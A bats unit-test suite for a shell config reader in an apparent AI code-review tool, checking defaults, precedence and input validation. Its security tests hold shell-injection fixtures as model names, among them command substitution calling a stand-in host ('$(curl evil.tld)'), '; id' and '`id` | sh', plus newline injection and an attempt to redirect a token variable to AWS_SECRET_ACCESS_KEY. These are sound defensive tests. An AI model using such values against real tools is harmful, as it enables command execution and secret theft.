#!/usr/bin/env bats
bats_require_minimum_version 1.5.0

# Unit tests for scripts/rc-config.sh — the deterministic config reader.
#
# Each test writes YAML fixtures into a per-test temp config dir and asserts the
# effective `key=value` lines on stdout (and skip-reason notes on stderr). YAML
# is parsed with mikefarah yq v4 (installed locally and in CI).
#
# Run: bats tests/unit/rc-config.bats

SCRIPT="$(cd "$(dirname "$BATS_TEST_FILENAME")/../.." && pwd)/scripts/rc-config.sh"

setup() {
  CFG="$BATS_TEST_TMPDIR/cfg"
  mkdir -p "$CFG"
}

# has_line <key=value>: assert an exact stdout line is present in $output.
has_line() {
  printf '%s\n' "$output" | grep -qxF "$1" || {
    echo "expected line: $1"
    echo "--- actual output ---"
    printf '%s\n' "$output"
    return 1
  }
}

@test "absent files -> all defaults" {
  run --separate-stderr "$SCRIPT" "$CFG"
  echo "status=$status"
  echo "output=<<$output>>"
  [ "$status" -eq 0 ]
  has_line "reviewer.claude.enabled=true"
  has_line "reviewer.perplexity.model=sonar"
  has_line "lens.dependency.providers=perplexity"
  has_line "lens.security.providers=auto"
  has_line "lens.security.replaces_dedicated=false"
  has_line "settings.run_budget_seconds=600"
  has_line "settings.min_reviewers=2"
  has_line "settings.auto_retry=false"
  # Phase-4 knobs -> defaults chosen so absent config = today's behavior
  # (probe off/opt-in; claude_max_turns lenient at 100 so wiring the knob
  # never clamps reviewers shorter than they run today).
  has_line "settings.health_probe=false"
  has_line "settings.health_probe_timeout_seconds=20"
  has_line "settings.claude_max_turns=100"
  # static_analysis.* is now emitted (previously: no `static_analysis:` block ->
  # the whole thing was ignored, no lines at all). Absent block -> defaults.
  has_line "static_analysis.enabled=true"
  has_line "static_analysis.tools=gitleaks,trufflehog,osv-scanner,semgrep,ruff,shellcheck,actionlint,hadolint"
  has_line "static_analysis.timeout_seconds=60"
  has_line "static_analysis.semgrep_config=p/default"
  # pr_comments.* -> default OFF (absent block == today's report-only behavior),
  # and the bot-token env var name defaults to RC_PR_BOT_TOKEN.
  has_line "pr_comments.enabled=false"
  has_line "pr_comments.bot_token_env=RC_PR_BOT_TOKEN"
}

@test "provider enable/disable from config.yml" {
  printf 'reviewers:\n  codex:\n    enabled: false\n' >"$CFG/config.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "reviewer.codex.enabled=false"
  # others unaffected
  has_line "reviewer.claude.enabled=true"
}

@test "model bind from config.yml" {
  printf 'reviewers:\n  google:\n    model: gemini-2.5-pro\n' >"$CFG/config.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "reviewer.google.model=gemini-2.5-pro"
}

@test "lens pin + security replace-semantics" {
  printf 'lenses:\n  security:\n    providers: [google]\n' >"$CFG/config.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "lens.security.providers=google"
  has_line "lens.security.replaces_dedicated=true"
}

@test "lens pin with multiple providers joins comma-separated" {
  printf 'lenses:\n  security:\n    providers: [google, claude]\n' >"$CFG/config.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "lens.security.providers=google,claude"
  has_line "lens.security.replaces_dedicated=true"
}

@test "each settings knob in config.yml is reflected" {
  cat >"$CFG/config.yml" <<'EOF'
settings:
  verify: false
  verify_max_findings: 5
  run_budget_seconds: 300
  min_reviewers: 3
EOF
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "settings.verify=false"
  has_line "settings.verify_max_findings=5"
  has_line "settings.run_budget_seconds=300"
  has_line "settings.min_reviewers=3"
}

@test "settings.health_probe: default false, config.yml/config.local.yml precedence, env override" {
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "settings.health_probe=false"

  printf 'settings:\n  health_probe: false\n' >"$CFG/config.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "settings.health_probe=false"

  printf 'settings:\n  health_probe: true\n' >"$CFG/config.local.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "settings.health_probe=true"

  RC_HEALTH_PROBE=false run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "settings.health_probe=false"
}

@test "settings.health_probe_timeout_seconds: default 20, config.yml/config.local.yml precedence, env override" {
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "settings.health_probe_timeout_seconds=20"

  printf 'settings:\n  health_probe_timeout_seconds: 10\n' >"$CFG/config.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "settings.health_probe_timeout_seconds=10"

  printf 'settings:\n  health_probe_timeout_seconds: 15\n' >"$CFG/config.local.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "settings.health_probe_timeout_seconds=15"

  RC_HEALTH_PROBE_TIMEOUT=5 run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "settings.health_probe_timeout_seconds=5"
}

@test "settings.claude_max_turns: default 100, config.yml/config.local.yml precedence, env override" {
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "settings.claude_max_turns=100"

  printf 'settings:\n  claude_max_turns: 10\n' >"$CFG/config.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "settings.claude_max_turns=10"

  printf 'settings:\n  claude_max_turns: 20\n' >"$CFG/config.local.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "settings.claude_max_turns=20"

  RC_CLAUDE_MAX_TURNS=5 run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "settings.claude_max_turns=5"
}

@test "precedence: config.local.yml > config.yml" {
  printf 'settings:\n  verify: true\n' >"$CFG/config.yml"
  printf 'settings:\n  verify: false\n' >"$CFG/config.local.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "settings.verify=false"
}

@test "precedence: env > config.local.yml" {
  printf 'settings:\n  verify: true\n' >"$CFG/config.yml"
  printf 'settings:\n  verify: false\n' >"$CFG/config.local.yml"
  RC_VERIFY=true run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "settings.verify=true"
}

@test "malformed value -> default + stderr note" {
  printf 'settings:\n  min_reviewers: abc\n' >"$CFG/config.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  echo "stderr=<<$stderr>>"
  [ "$status" -eq 0 ]
  has_line "settings.min_reviewers=2"
  printf '%s\n' "$stderr" | grep -q 'min_reviewers'
}

@test "malformed file -> skipped with note, other layer still used" {
  printf ':::not valid yaml:::\n  a: : b\n' >"$CFG/config.yml"
  printf 'settings:\n  verify: false\n' >"$CFG/config.local.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  echo "stderr=<<$stderr>>"
  [ "$status" -eq 0 ]
  has_line "settings.verify=false"
  printf '%s\n' "$stderr" | grep -qi 'malformed'
}

@test "unknown key ignored, output unaffected" {
  cat >"$CFG/config.yml" <<'EOF'
bogus_top_level: 1
settings:
  not_a_real_key: 9
  verify: false
EOF
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "settings.verify=false"
  # still emits the full default roster
  has_line "reviewer.claude.enabled=true"
}

@test "yq-absent fallback: files ignored, defaults + env, yq-not-found note" {
  # Force yq-absent deterministically via RC_YQ pointing at an unresolvable path.
  # (Stripping PATH is unreliable: CI runners may ship yq in /usr/bin.)
  # Config sets min_reviewers:9, but with no usable yq the file is ignored and
  # only the env override should take effect.
  printf 'settings:\n  min_reviewers: 9\n' >"$CFG/config.yml"
  RC_YQ=/nonexistent/yq RC_VERIFY=false run --separate-stderr "$SCRIPT" "$CFG"
  echo "status=$status"
  echo "stderr=<<$stderr>>"
  [ "$status" -eq 0 ]
  # file ignored -> min_reviewers stays default (not 9)
  has_line "settings.min_reviewers=2"
  # env still applies
  has_line "settings.verify=false"
  # defaults still emitted
  has_line "reviewer.perplexity.model=sonar"
  printf '%s\n' "$stderr" | grep -q 'yq not found'
}

@test "wrong yq flavor (Python yq, no mikefarah): files ignored, defaults + env, distinct note" {
  # Two different tools are named `yq`: mikefarah (Go — this reader's
  # required tag/query syntax) and a Python one (kislyuk) that prints e.g.
  # "yq 3.4.3" with no "mikefarah". A fake shim simulates the Python yq being
  # first on PATH: `command -v` finds *a* yq, but it's the wrong one. Config
  # sets min_reviewers:9, but since the resolved yq isn't mikefarah v4, the
  # reader must ignore the file entirely (not just fail individual queries)
  # and fall back to defaults + env, exactly like the yq-absent case.
  FAKE_YQ="$BATS_TEST_TMPDIR/yq"
  cat >"$FAKE_YQ" <<'EOF'
#!/usr/bin/env sh
echo "yq 3.4.3"
exit 0
EOF
  chmod +x "$FAKE_YQ"
  printf 'settings:\n  min_reviewers: 9\n' >"$CFG/config.yml"
  RC_YQ="$FAKE_YQ" RC_VERIFY=false run --separate-stderr "$SCRIPT" "$CFG"
  echo "status=$status"
  echo "stderr=<<$stderr>>"
  [ "$status" -eq 0 ]
  # file ignored -> min_reviewers stays default (not 9)
  has_line "settings.min_reviewers=2"
  # env still applies
  has_line "settings.verify=false"
  # defaults still emitted
  has_line "reviewer.perplexity.model=sonar"
  printf '%s\n' "$stderr" | grep -q 'not mikefarah'
  printf '%s\n' "$stderr" | grep -q 'config files ignored'
}

@test "static_analysis block with unrecognized sub-keys -> those ignored, real keys still default, no crash" {
  # `semgrep:` (a per-tool sub-block) and `eslint:` are NOT among the four
  # documented static_analysis.* keys (enabled/tools/timeout_seconds/
  # semgrep_config) -> ignored like any other unknown key, without erroring
  # the rest of the file. The four real keys still emit their defaults.
  cat >"$CFG/config.yml" <<'EOF'
static_analysis:
  semgrep:
    enabled: true
  eslint: true
settings:
  verify: false
EOF
  run --separate-stderr "$SCRIPT" "$CFG"
  echo "status=$status"
  [ "$status" -eq 0 ]
  has_line "settings.verify=false"
  has_line "reviewer.claude.enabled=true"
  # the four real static_analysis.* keys are emitted with their defaults
  has_line "static_analysis.enabled=true"
  has_line "static_analysis.tools=gitleaks,trufflehog,osv-scanner,semgrep,ruff,shellcheck,actionlint,hadolint"
  has_line "static_analysis.timeout_seconds=60"
  has_line "static_analysis.semgrep_config=p/default"
}

@test "static_analysis.enabled: config.yml sets false, then RC_STATIC_ANALYSIS env overrides back to true" {
  printf 'static_analysis:\n  enabled: false\n' >"$CFG/config.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "static_analysis.enabled=false"

  RC_STATIC_ANALYSIS=true run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "static_analysis.enabled=true"
}

@test "static_analysis.tools: explicit list from config.yml" {
  printf 'static_analysis:\n  tools: [gitleaks, semgrep]\n' >"$CFG/config.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "static_analysis.tools=gitleaks,semgrep"
}

@test "static_analysis.tools: RC_STATIC_TOOLS env overrides the config.yml list" {
  printf 'static_analysis:\n  tools: [gitleaks, semgrep]\n' >"$CFG/config.yml"
  RC_STATIC_TOOLS="ruff,shellcheck" run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "static_analysis.tools=ruff,shellcheck"
}

@test "static_analysis.tools: unknown tool token dropped with a note, valid ones kept" {
  printf 'static_analysis:\n  tools: [gitleaks, eslint, semgrep]\n' >"$CFG/config.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  echo "stderr=<<$stderr>>"
  [ "$status" -eq 0 ]
  has_line "static_analysis.tools=gitleaks,semgrep"
  printf '%s\n' "$stderr" | grep -q "unknown tool 'eslint'"
}

@test "static_analysis.tools: unknown token in RC_STATIC_TOOLS env also dropped with a note" {
  RC_STATIC_TOOLS="gitleaks, bogus-tool ,ruff" run --separate-stderr "$SCRIPT" "$CFG"
  echo "stderr=<<$stderr>>"
  [ "$status" -eq 0 ]
  # valid tokens kept (and env-provided whitespace around tokens trimmed)
  has_line "static_analysis.tools=gitleaks,ruff"
  printf '%s\n' "$stderr" | grep -q "unknown tool 'bogus-tool'"
}

@test "static_analysis.tools: glob-metacharacter token is treated literally, not pathname-expanded" {
  # Regression guard: an unquoted `for tok in $list` (needed to split on
  # commas) would otherwise let a token like `*` undergo pathname expansion
  # against the CWD's files instead of being validated as a literal string.
  RC_STATIC_TOOLS='*' run --separate-stderr "$SCRIPT" "$CFG"
  echo "stderr=<<$stderr>>"
  [ "$status" -eq 0 ]
  has_line "static_analysis.tools="
  printf '%s\n' "$stderr" | grep -qF "unknown tool '*'"
}

@test "static_analysis.timeout_seconds: default, config override, malformed->default, env override" {
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "static_analysis.timeout_seconds=60"

  printf 'static_analysis:\n  timeout_seconds: 30\n' >"$CFG/config.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "static_analysis.timeout_seconds=30"

  printf 'static_analysis:\n  timeout_seconds: abc\n' >"$CFG/config.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  echo "stderr=<<$stderr>>"
  [ "$status" -eq 0 ]
  has_line "static_analysis.timeout_seconds=60"
  printf '%s\n' "$stderr" | grep -q 'static_analysis.timeout_seconds'

  rm -f "$CFG/config.yml"
  RC_STATIC_TIMEOUT=45 run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "static_analysis.timeout_seconds=45"
}

@test "static_analysis.semgrep_config: default p/default, off, custom path, env override" {
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "static_analysis.semgrep_config=p/default"

  printf 'static_analysis:\n  semgrep_config: "off"\n' >"$CFG/config.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "static_analysis.semgrep_config=off"

  printf 'static_analysis:\n  semgrep_config: .semgrep/custom.yml\n' >"$CFG/config.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "static_analysis.semgrep_config=.semgrep/custom.yml"

  RC_SEMGREP_CONFIG=p/ci run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "static_analysis.semgrep_config=p/ci"
}

@test "static_analysis.*: precedence env > config.local.yml > config.yml > default holds" {
  printf 'static_analysis:\n  timeout_seconds: 30\n' >"$CFG/config.yml"
  printf 'static_analysis:\n  timeout_seconds: 45\n' >"$CFG/config.local.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "static_analysis.timeout_seconds=45"

  RC_STATIC_TIMEOUT=90 run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "static_analysis.timeout_seconds=90"
}

@test "static_analysis.semgrep_config with embedded newline -> default + note, no injected stdout line" {
  # Same control-char-free validation as reviewer.<p>.model: an embedded
  # newline would otherwise inject a fabricated key=value stdout line.
  cat >"$CFG/config.yml" <<'EOF'
static_analysis:
  semgrep_config: "auto\ninjected.line=malicious"
EOF
  run --separate-stderr "$SCRIPT" "$CFG"
  echo "status=$status"
  echo "output=<<$output>>"
  echo "stderr=<<$stderr>>"
  [ "$status" -eq 0 ]
  # crafted value rejected -> falls back to the default ("auto")
  has_line "static_analysis.semgrep_config=p/default"
  printf '%s\n' "$stderr" | grep -q 'static_analysis.semgrep_config'
  ! printf '%s\n' "$output" | grep -q 'injected.line'
  ! printf '%s\n' "$output" | grep -vE '^#|='
}

@test "string value with embedded newline -> default + note, no injected stdout line" {
  # A model value with an embedded newline would split into a second, fabricated
  # key=value line, breaking the one-per-line output contract. It must be
  # rejected like any malformed value: default + stderr note.
  cat >"$CFG/config.yml" <<'EOF'
reviewers:
  google:
    model: "abc\ninjected.line=malicious"
EOF
  run --separate-stderr "$SCRIPT" "$CFG"
  echo "status=$status"
  echo "output=<<$output>>"
  echo "stderr=<<$stderr>>"
  [ "$status" -eq 0 ]
  # crafted value rejected -> model falls back to its default (empty)
  has_line "reviewer.google.model="
  # stderr note names the offending key
  printf '%s\n' "$stderr" | grep -q 'reviewer.google.model'
  # NO fabricated key=value line reached stdout
  ! printf '%s\n' "$output" | grep -q 'injected.line'
  # contract intact: every stdout line is a `# comment` or a `key=value` pair
  ! printf '%s\n' "$output" | grep -vE '^#|='
}

@test "providers entry with embedded newline -> default + note, no injected stdout line" {
  cat >"$CFG/config.yml" <<'EOF'
lenses:
  security:
    providers: ["google\ninjected.line=x"]
EOF
  run --separate-stderr "$SCRIPT" "$CFG"
  echo "status=$status"
  echo "output=<<$output>>"
  echo "stderr=<<$stderr>>"
  [ "$status" -eq 0 ]
  # rejected pin -> providers falls back to the default (auto), not a partial pin
  has_line "lens.security.providers=auto"
  has_line "lens.security.replaces_dedicated=false"
  printf '%s\n' "$stderr" | grep -q 'lens.security.providers'
  ! printf '%s\n' "$output" | grep -q 'injected.line'
  # contract intact: no fabricated non-key=value stdout line
  ! printf '%s\n' "$output" | grep -vE '^#|='
}

@test "layered-invalid: higher layer invalid keeps lower layer's valid value" {
  # config.yml sets a VALID value; config.local.yml sets an INVALID one for the
  # same key. The higher-precedence-but-invalid value must NOT clobber the lower
  # valid one — the valid config.yml value stands, with a stderr note.
  printf 'settings:\n  min_reviewers: 3\n' >"$CFG/config.yml"
  printf 'settings:\n  min_reviewers: abc\n' >"$CFG/config.local.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  echo "status=$status"
  echo "stderr=<<$stderr>>"
  [ "$status" -eq 0 ]
  has_line "settings.min_reviewers=3"
  printf '%s\n' "$stderr" | grep -q 'min_reviewers'
}

# ---------------------------------------------------------------------------
# modelslug guard on reviewer.<p>.model — the injection sink.
#
# A model value is interpolated UNQUOTED into a shell command the orchestrator
# composes (skills/run/SKILL.md's RC_GOOGLE_MODEL=<model> template), IN THE
# ORCHESTRATOR'S OWN SESSION, OUTSIDE ANY SANDBOX. The reader's control-chars-
# only `valid_str` let shell metacharacters (space, ; | ` $ ( )) survive, so a
# repo-committed config.yml could reach command position. The `modelslug` kind
# is a charset allowlist at the reader — the only real defense, since $(...)
# expands even inside double quotes so an LLM quoting the template can't save it.
# ---------------------------------------------------------------------------

@test "modelslug: command-substitution in a model value is rejected + noted" {
  cat >"$CFG/config.yml" <<'EOF'
reviewers:
  google:
    model: "gemini-3 $(curl evil.tld)"
EOF
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  # rejected -> falls back to google's default (empty)
  has_line "reviewer.google.model="
  printf '%s\n' "$stderr" | grep -q 'reviewer.google.model'
  # the metacharacters never reach stdout
  ! printf '%s\n' "$output" | grep -q 'curl evil'
  ! printf '%s\n' "$output" | grep -vE '^#|='
}

@test "modelslug: semicolon/space in a model value is rejected (the live exploit)" {
  cat >"$CFG/config.yml" <<'EOF'
reviewers:
  google:
    model: "gemini-3 ; id"
EOF
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "reviewer.google.model="
  printf '%s\n' "$stderr" | grep -q 'reviewer.google.model'
  ! printf '%s\n' "$output" | grep -qF 'gemini-3 ; id'
}

@test "modelslug: backtick and pipe in a model value are rejected" {
  cat >"$CFG/config.yml" <<'EOF'
reviewers:
  codex:
    model: "gpt `id` | sh"
EOF
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "reviewer.codex.model="
  printf '%s\n' "$stderr" | grep -q 'reviewer.codex.model'
}

@test "modelslug: a leading hyphen is rejected (no flag injection)" {
  cat >"$CFG/config.yml" <<'EOF'
reviewers:
  google:
    model: "-cfoo"
EOF
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "reviewer.google.model="
  printf '%s\n' "$stderr" | grep -q 'reviewer.google.model'
}

@test "modelslug: the guard covers every reviewer, not just google" {
  cat >"$CFG/config.yml" <<'EOF'
reviewers:
  claude:
    model: "opus ; id"
  perplexity:
    model: "sonar ; id"
EOF
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  # claude falls back to its empty default; perplexity to its 'sonar' default
  has_line "reviewer.claude.model="
  has_line "reviewer.perplexity.model=sonar"
  printf '%s\n' "$stderr" | grep -q 'reviewer.claude.model'
  printf '%s\n' "$stderr" | grep -q 'reviewer.perplexity.model'
}

@test "modelslug: real slugs are admitted unchanged" {
  cat >"$CFG/config.yml" <<'EOF'
reviewers:
  google:
    model: gemini-2.5-pro
  codex:
    model: openai/gpt-4o:free
  claude:
    model: ~moonshotai/kimi-latest
EOF
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "reviewer.google.model=gemini-2.5-pro"
  has_line "reviewer.codex.model=openai/gpt-4o:free"
  has_line "reviewer.claude.model=~moonshotai/kimi-latest"
  # a clean config emits no notes about these keys
  ! printf '%s\n' "$stderr" | grep -q 'reviewer.google.model'
}

@test "modelslug: an explicit empty model stays valid (no spurious note, no default swap)" {
  # Empty means "use the tool's own default" — must remain valid, exactly as the
  # old `str` kind treated it. Regressing this would flip perplexity's explicit
  # empty into its 'sonar' default.
  cat >"$CFG/config.yml" <<'EOF'
reviewers:
  perplexity:
    model: ""
EOF
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "reviewer.perplexity.model="
  ! printf '%s\n' "$stderr" | grep -q 'reviewer.perplexity.model'
}

# ---------------------------------------------------------------------------
# pr_comments.* — the optional PR-digest posting gate
# ---------------------------------------------------------------------------

@test "pr_comments: enabled from config.yml; bot_token_env from config.local.yml admitted" {
  # enabled is a fine committed team default; bot_token_env must come from a
  # TRUSTED layer (config.local.yml), because its NAME selects which local secret
  # is read and sent to GitHub.
  printf 'pr_comments:\n  enabled: true\n' >"$CFG/config.yml"
  printf 'pr_comments:\n  bot_token_env: MY_BOT_TOKEN\n' >"$CFG/config.local.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "pr_comments.enabled=true"
  has_line "pr_comments.bot_token_env=MY_BOT_TOKEN"
  ! printf '%s\n' "$stderr" | grep -q 'pr_comments'
}

@test "pr_comments: bot_token_env in the committed config.yml is IGNORED (untrusted layer)" {
  # A reviewed repo could commit config.yml pointing bot_token_env at a local
  # secret (e.g. AWS_SECRET_ACCESS_KEY — a valid identifier). It must be ignored,
  # falling back to the default, with a note.
  cat >"$CFG/config.yml" <<'EOF'
pr_comments:
  enabled: true
  bot_token_env: AWS_SECRET_ACCESS_KEY
EOF
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "pr_comments.enabled=true"
  has_line "pr_comments.bot_token_env=RC_PR_BOT_TOKEN"
  ! printf '%s\n' "$output" | grep -qF 'AWS_SECRET_ACCESS_KEY'
  printf '%s\n' "$stderr" | grep -q 'pr_comments.bot_token_env'
}

@test "pr_comments: RC_PR_BOT_TOKEN_ENV env overrides the token var name" {
  printf 'pr_comments:\n  enabled: true\n' >"$CFG/config.yml"
  RC_PR_BOT_TOKEN_ENV=CI_BOT_TOKEN run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "pr_comments.bot_token_env=CI_BOT_TOKEN"
}

@test "pr_comments: RC_PR_COMMENTS env overrides enabled" {
  # config says off; env forces it on (the CI-toggle path).
  printf 'pr_comments:\n  enabled: false\n' >"$CFG/config.yml"
  RC_PR_COMMENTS=true run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "pr_comments.enabled=true"
}

@test "pr_comments: a non-bool enabled falls back to the default with a note" {
  printf 'pr_comments:\n  enabled: yes-please\n' >"$CFG/config.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "pr_comments.enabled=false"
  printf '%s\n' "$stderr" | grep -q 'pr_comments.enabled'
}

@test "pr_comments: bot_token_env with shell metacharacters is rejected to default" {
  # Read via indirect expansion downstream, so a value that could reach command
  # position must be rejected at the reader. (Set in the trusted local layer.)
  printf 'pr_comments:\n  bot_token_env: "FOO; id"\n' >"$CFG/config.local.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "pr_comments.bot_token_env=RC_PR_BOT_TOKEN"
  printf '%s\n' "$stderr" | grep -q 'pr_comments.bot_token_env'
  ! printf '%s\n' "$output" | grep -qF 'FOO; id'
}

@test "pr_comments: a bot_token_env starting with a digit is rejected (not a POSIX name)" {
  printf 'pr_comments:\n  bot_token_env: 1BADNAME\n' >"$CFG/config.local.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "pr_comments.bot_token_env=RC_PR_BOT_TOKEN"
  printf '%s\n' "$stderr" | grep -q 'pr_comments.bot_token_env'
}

@test "pr_comments: an explicit empty bot_token_env stays empty (no bot -> user identity)" {
  # Empty is a valid, deliberate choice: no bot-token var -> always post as the
  # authenticated user. It must NOT swap in the RC_PR_BOT_TOKEN default.
  printf 'pr_comments:\n  bot_token_env: ""\n' >"$CFG/config.local.yml"
  run --separate-stderr "$SCRIPT" "$CFG"
  [ "$status" -eq 0 ]
  has_line "pr_comments.bot_token_env="
  ! printf '%s\n' "$stderr" | grep -q 'pr_comments.bot_token_env'
}
